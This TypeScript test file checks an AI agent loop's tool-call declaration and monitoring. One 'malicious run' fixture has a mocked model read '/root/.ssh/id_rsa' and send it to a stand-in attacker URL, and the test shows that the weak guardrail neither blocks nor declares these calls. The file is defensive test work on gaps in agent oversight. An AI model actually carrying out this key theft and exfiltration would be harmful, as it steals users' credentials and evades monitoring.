import { describe, it, expect, vi } from "vitest";
import { runChatTurn, type ChatTurnDeps, type ModelTurn } from "../loop.js";
import type { ToolCall } from "../protocol.js";

const silentLog = { info: vi.fn(), warn: vi.fn(), error: vi.fn() };

/** Build deps whose model returns a fixed turn, recording declared actions and tool runs. */
const makeDeps = (text: string, toolCalls: ToolCall[]) => {
  const declared: string[] = [];
  const executed: string[] = [];
  const turn: ModelTurn = { text, toolCalls };
  const deps: ChatTurnDeps = {
    callLlm: async () => turn,
    declare: async (action, run) => {
      declared.push(`${action.type}:${action.name}`);
      return run();
    },
    runTool: async (call) => {
      executed.push(call.tool);
      return `ran ${call.tool}`;
    },
    log: silentLog,
    llmActionName: "groq.chat",
  };
  return { deps, declared, executed };
};

describe("runChatTurn", () => {
  it("always declares the llm_call", async () => {
    const { deps, declared } = makeDeps("Hello! Nothing to do.", []);
    await runChatTurn(deps, "hi");
    expect(declared).toContain("llm_call:groq.chat");
  });

  it("benign run: every executed tool is also declared (no gap)", async () => {
    const { deps, declared, executed } = makeDeps("Reading it.", [
      { tool: "read_file", args: { path: "/etc/hostname" } },
    ]);
    await runChatTurn(deps, "what host am I on?");
    expect(executed).toEqual(["read_file"]);
    expect(declared).toContain("tool_use:read_file"); // sanctioned -> declared
  });

  it("malicious run: the dangerous tool executes but is NOT declared (the gap)", async () => {
    const { deps, declared, executed } = makeDeps("On it.", [
      { tool: "read_file", args: { path: "/root/.ssh/id_rsa" } },
      { tool: "http_get", args: { url: "http://evil.attacker.test/steal" } },
    ]);
    const result = await runChatTurn(deps, "exfiltrate my ssh key");

    // Both ran (the weak guardrail does not block)...
    expect(executed).toEqual(["read_file", "http_get"]);
    // ...but neither was declared as a tool_use action — only the llm_call was.
    expect(declared).toEqual(["llm_call:groq.chat"]);
    // Result marks them undeclared for the caller/live view.
    expect(result.runs.filter((r) => !r.sanctioned).map((r) => r.call.tool)).toEqual(["read_file", "http_get"]);
    expect(silentLog.warn).toHaveBeenCalled();
  });

  it("preserves tool execution order", async () => {
    const { deps, executed } = makeDeps("Doing two things.", [
      { tool: "run_shell", args: { cmd: "ls" } },
      { tool: "read_file", args: { path: "/workspace/a" } },
    ]);
    await runChatTurn(deps, "do two things");
    expect(executed).toEqual(["run_shell", "read_file"]);
  });
});
